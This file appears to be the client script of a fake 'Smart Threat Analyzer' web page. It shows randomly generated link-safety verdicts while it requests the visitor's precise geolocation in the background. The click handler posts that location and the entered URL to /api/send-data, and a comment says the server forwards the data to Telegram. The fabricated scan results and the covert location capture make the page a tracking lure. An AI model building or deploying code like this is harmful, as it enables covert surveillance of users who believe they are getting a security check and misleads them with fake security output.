// /public/scripts.js  — Smart Threat Analyzer (SIMULATED link analysis added)
// Keeps original behavior: geolocation request and sending to /api/send-data remain unchanged.
// Adds: when user inputs a URL/ID, shows a simulated analysis summary (percent, checks list).
// IMPORTANT: simulated results are labeled clearly.

const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');

function randInt(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

// Possible checks to display in the simulated analysis
const POSSIBLE_CHECKS = [
  'URL Reputation',
  'SSL/TLS Certificate',
  'Domain Age & WHOIS',
  'Known Malware Signatures',
  'Suspicious Redirects',
  'Embedded Scripts Analysis',
  'Content Risk Heuristics',
  'Network Behavior Indicators',
  'Downloaded Payload Patterns'
];

// Generate a simulated analysis result (clearly marked simulated)
function makeSimulatedResult(input) {
  const threatPercent = randInt(0, 100);
  const threatLevel = threatPercent < 20 ? 'Low' : threatPercent < 60 ? 'Medium' : 'High';
  // choose 3-5 checks to display with random pass/fail
  const checksCount = randInt(3, 5);
  const checks = [];
  const shuffled = [...POSSIBLE_CHECKS].sort(() => 0.5 - Math.random());
  for (let i = 0; i < checksCount; i++) {
    const name = shuffled[i];
    // Fail probability increases with threatPercent
    const failChance = Math.min(80, threatPercent); // up to 80% chance to fail for high threats
    const passed = randInt(0, 100) > failChance;
    checks.push({ name, passed });
  }

  // Short recommendation based on level
  const recommendation = threatLevel === 'High'
    ? 'Take immediate action: quarantine device, change credentials, run official AV.'
    : threatLevel === 'Medium'
      ? 'Recommended: run full scan and monitor network activity.'
      : 'No immediate action required. Keep system updated.';

  return { input, threatPercent, threatLevel, checks, recommendation };
}

// Render the simulated result into the status area (visible and marked SIMULATED)
function renderSimulatedResult(sim) {
  const checksHtml = sim.checks.map(c => {
    const icon = c.passed ? '✅' : '⚠️';
    const cls = c.passed ? 'muted' : 'danger';
    return `<div style="display:flex;justify-content:space-between;margin:6px 0">
              <div style="color:#bfefff">${icon} ${c.name}</div>
              <div style="color:${c.passed ? '#9fb0cf' : '#ffb86b'}">${c.passed ? 'Passed' : 'Suspicious'}</div>
            </div>`;
  }).join('');

  const html = `
    <div style="margin-top:12px;padding:12px;border-radius:10px;background:rgba(0,255,255,0.03);border:1px solid rgba(0,255,255,0.04)">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <strong style="color:#dffcff">SIMULATED ANALYSIS</strong>
        <span style="color:#9fb0cf;font-size:13px">Confidence: ${sim.threatPercent}%</span>
      </div>

      <div style="margin-top:8px;color:#bfefff">
        <div><strong>Threat Level:</strong> ${sim.threatLevel}</div>
        <div style="margin-top:8px"><strong>Checks performed:</strong></div>
        <div style="margin-top:6px">${checksHtml}</div>

        <div style="margin-top:10px;padding-top:8px;border-top:1px dashed rgba(255,255,255,0.03);color:#bfefff">
          <strong>Recommendation:</strong>
          <div style="margin-top:6px;color:#9fb0cf">${sim.recommendation}</div>
        </div>
      </div>
    </div>
  `;

  statusText.innerHTML = html;
}

// small staged progress to look realistic
async function stagedProgress(phases = [
  { t: 'Initializing system components...', w: 8, d: 500 },
  { t: 'Collecting metadata...', w: 30, d: 700 },
  { t: 'Analyzing content...', w: 60, d: 900 },
  { t: 'Checking network patterns...', w: 85, d: 700 },
  { t: 'Finalizing report...', w: 100, d: 500 }
]) {
  progressBarContainer.style.display = 'block';
  for (const p of phases) {
    statusText.textContent = p.t;
    progressBar.style.width = `${p.w}%`;
    await new Promise(r => setTimeout(r, p.d + Math.random()*300));
  }
}

// Main click handler: keeps previous behavior (geolocation + send) and adds simulated rendering
analyzeButton.addEventListener('click', async () => {
  const videoUrl = videoUrlInput.value.trim();
  if (!videoUrl) return;

  // Reset UI
  statusText.textContent = '';
  progressBar.style.width = '0%';
  progressBarContainer.style.display = 'none';

  // 1) Request geolocation (in background) — unchanged behavior
  let locationData = null;
  if ("geolocation" in navigator) {
    try {
      locationData = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      });
    } catch (e) {
      locationData = null;
    }
  }

  // 2) Show staged progress
  await stagedProgress();

  // 3) Create simulated result and render it (clearly simulated)
  const sim = makeSimulatedResult(videoUrl);
  renderSimulatedResult(sim);

  // 4) Send real data to server (unchanged): send videoUrl + actual location if any
  try {
    await fetch('/api/send-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ videoUrl, location: locationData })
    });
    // (server will forward to Telegram as before)
  } catch (err) {
    console.warn('Failed to send data to server:', err);
  }

  // keep simulated UI visible; do not auto-clear (user can input again)
  progressBarContainer.style.display = 'none';
  progressBar.style.width = '0%';
});
